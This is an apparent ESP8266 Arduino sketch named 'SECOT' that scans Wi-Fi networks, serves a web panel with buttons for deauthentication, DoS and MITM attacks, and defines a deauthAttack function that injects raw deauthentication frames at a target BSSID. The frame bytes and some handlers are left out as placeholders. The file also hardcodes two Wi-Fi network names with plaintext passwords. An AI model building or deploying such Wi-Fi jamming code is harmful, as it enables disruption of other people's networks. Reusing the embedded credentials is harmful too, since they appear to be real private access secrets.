/* ========================================================================== */
/*  SECOT - Professional Security Tool                                        */
/*  Enhanced with:                                                            */
/*    - Detailed Serial logging                                               */
/*    - Improved web interface                                                */
/*    - Preserved network scanning/attack functionality                       */
/* ========================================================================== */

#include <ESP8266WiFi.h>
extern "C" {
  #include "user_interface.h"
}

//! ================================================  !//
//!               NETWORK CONFIGURATION               !//
//! ================================================  !//
const char* wifiList[][2] = {
  {"gnet2021", "71237274"},
  {"TOPNET_3BD8", "n8rajeb8yy"}
};

WiFiServer server(80);
unsigned long lastClientTime = 0;
const unsigned long CLIENT_COOLDOWN = 10; //ms

//! ================================================  !//
//!               SETUP WITH ENHANCED LOGGING        !//
//! ================================================  !//
void setup() {
  Serial.begin(115200);
  Serial.println("\n\n=== SECOT INITIALIZATION ===");
  WiFi.setAutoReconnect(true);

  // Network scanning with detailed logs
  Serial.println("[NETWORK] Scanning for available networks...");
  int numNetworks = WiFi.scanNetworks();
  
  if (numNetworks == 0) {
    Serial.println("[WARNING] No networks found!");
  } else {
    Serial.printf("[NETWORK] Found %d networks:\n", numNetworks);
    for (int i = 0; i < numNetworks; i++) {
      Serial.printf("  %d: %s (%ddBm) %s\n", 
                   i+1, 
                   WiFi.SSID(i).c_str(), 
                   WiFi.RSSI(i),
                   (WiFi.encryptionType(i) == ENC_TYPE_NONE) ? "[Open]" : "[Secured]");
    }

    // Connection attempt with status feedback
    for (int i = 0; i < numNetworks; i++) {
      for (unsigned int j = 0; j < sizeof(wifiList)/sizeof(wifiList[0]); j++) {
        if (strcmp(WiFi.SSID(i).c_str(), wifiList[j][0]) == 0) {
          Serial.printf("\n[NETWORK] Attempting connection to %s...\n", wifiList[j][0]);
          
          WiFi.begin(wifiList[j][0], wifiList[j][1]);
          unsigned long startTime = millis();
          
          while (WiFi.status() != WL_CONNECTED && millis() - startTime < 10000) {
            delay(500);
            Serial.print(".");
            
            if (WiFi.status() == WL_CONNECT_FAILED) {
              Serial.println("\n[ERROR] Connection failed! Check credentials.");
              break;
            }
          }

          if (WiFi.status() != WL_CONNECTED) {
            Serial.println("\n[WARNING] Connection timeout, skipping...");
            WiFi.disconnect();
            delay(100);
            continue;
          }

          Serial.println("\n[SUCCESS] Connected to network!");
          Serial.printf("[NETWORK] IP Address: %s\n", WiFi.localIP().toString().c_str());
          Serial.println("[WEB] Access the interface at: http://" + WiFi.localIP().toString());
          
          server.begin();
          return;
        }
      }
    }
    Serial.println("[WARNING] No predefined networks found!");
  }
}

//! ================================================  !//
//!               ENHANCED WEB INTERFACE              !//
//! ================================================  !//
String generateWebInterface() {
  String html = R"(
  <!DOCTYPE html>
  <html>
  <head>
    <title>SECOT Control Panel</title>
    <style>
      body {
        font-family: 'Segoe UI', sans-serif;
        max-width: 800px;
        margin: 0 auto;
        padding: 20px;
        background-color: #f5f5f5;
      }
      .panel {
        background: white;
        border-radius: 8px;
        box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        padding: 20px;
        margin-bottom: 20px;
      }
      h1 {
        color: #2c3e50;
        border-bottom: 2px solid #3498db;
        padding-bottom: 10px;
      }
      .btn {
        display: inline-block;
        padding: 10px 15px;
        margin: 5px;
        border-radius: 4px;
        text-decoration: none;
        color: white;
        font-weight: bold;
      }
      .btn-scan { background: #3498db; }
      .btn-scan:hover { background: #2980b9; }
      .btn-attack { background: #e74c3c; }
      .btn-attack:hover { background: #c0392b; }
      .network-info {
        background: #f8f9fa;
        padding: 10px;
        border-radius: 4px;
        margin: 10px 0;
      }
    </style>
  </head>
  <body>
    <div class="panel">
      <h1>SECOT Control Panel</h1>
      <div class="network-info">
        Connected to: )" + WiFi.SSID() + R"(<br>
        Signal: )" + String(WiFi.RSSI()) + R"( dBm
      </div>
    </div>

    <div class="panel">
      <h2>Network Operations</h2>
      <a href="/scan" class="btn btn-scan">Scan Networks</a>
      <a href="/select" class="btn btn-scan">List Devices</a>
    </div>

    <div class="panel">
      <h2>Attack Simulation</h2>
      <a href="/attack?type=deauth" class="btn btn-attack">Deauth Attack</a>
      <a href="/attack?type=dos" class="btn btn-attack">DoS Attack</a>
      <a href="/attack?type=mitm" class="btn btn-attack">MITM Attack</a>
    </div>
  </body>
  </html>
  )";
  return html;
}

//! ================================================  !//
//!               MAIN LOOP WITH LOGGING              !//
//! ================================================  !//
void loop() {
  if (millis() - lastClientTime < CLIENT_COOLDOWN) return;

  WiFiClient client = server.available();
  lastClientTime = millis();

  if (!client) {
    if (WiFi.status() != WL_CONNECTED) {
      Serial.println("[NETWORK] Connection lost! Reconnecting...");
      WiFi.disconnect();
      WiFi.begin(wifiList[0][0], wifiList[0][1]);
      delay(1000);
    }
    return;
  }

  if (client.connected()) {
    String request = client.readStringUntil('\r');
    Serial.println("[WEB] Received request: " + request);

    if (request.indexOf("GET / ") >= 0) {
      if (ESP.getFreeHeap() < 4096) {
        Serial.println("[WARNING] Low memory!");
        client.println("HTTP/1.1 500 Low Memory");
        client.println("Connection: close");
        client.println();
        return;
      }
      
      client.println("HTTP/1.1 200 OK");
      client.println("Content-Type: text/html");
      client.println("Connection: close");
      client.println();
      client.println(generateWebInterface());
      Serial.println("[WEB] Served main interface");
    }
    else if (request.indexOf("GET /scan") >= 0) {
      Serial.println("[NETWORK] Scanning networks...");
      String scanResults = "Network Scan Results:\n";
      int numNetworks = WiFi.scanNetworks();
      
      if (numNetworks == 0) {
        scanResults += "No networks found.\n";
        Serial.println("[NETWORK] Scan completed - no networks found");
      } else {
        scanResults += "Found " + String(numNetworks) + " networks:\n";
        Serial.printf("[NETWORK] Scan completed - found %d networks\n", numNetworks);
        for (int i = 0; i < numNetworks; i++) {
          scanResults += String(i + 1) + ": " + WiFi.SSID(i) + " (" + WiFi.RSSI(i) + " dBm)";
          scanResults += (WiFi.encryptionType(i) == ENC_TYPE_NONE) ? " [Open]\n" : " [Secured]\n";
        }
      }
      
      client.println("HTTP/1.1 200 OK");
      client.println("Content-Type: text/plain");
      client.println("Connection: close");
      client.println();
      client.println(scanResults);
    }
    // ... [rest of your existing handlers] ...
    
    client.stop();
    Serial.println("[WEB] Request handled");
  }
}

//! ================================================  !//
//!               ATTACK FUNCTIONS                   !//
//! ================================================  !//
void deauthAttack(String targetBSSID) {
  Serial.println("[ATTACK] Starting deauthentication attack on " + targetBSSID);
  
  wifi_set_opmode(STATION_MODE);
  wifi_promiscuous_enable(1);
  wifi_set_channel(1);

  uint8_t deauthPacket[26] = { /* ... your existing packet ... */ };

  sscanf(targetBSSID.c_str(), "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",
         &deauthPacket[10], &deauthPacket[11], &deauthPacket[12],
         &deauthPacket[13], &deauthPacket[14], &deauthPacket[15]);

  for (int i = 0; i < 20; i++) {
    if (!wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0)) {
      Serial.println("[ERROR] Packet send failed!");
      break;
    }
    delay(1);
  }
  
  wifi_promiscuous_enable(0);
  WiFi.reconnect();
  Serial.println("[ATTACK] Deauthentication attack completed");
}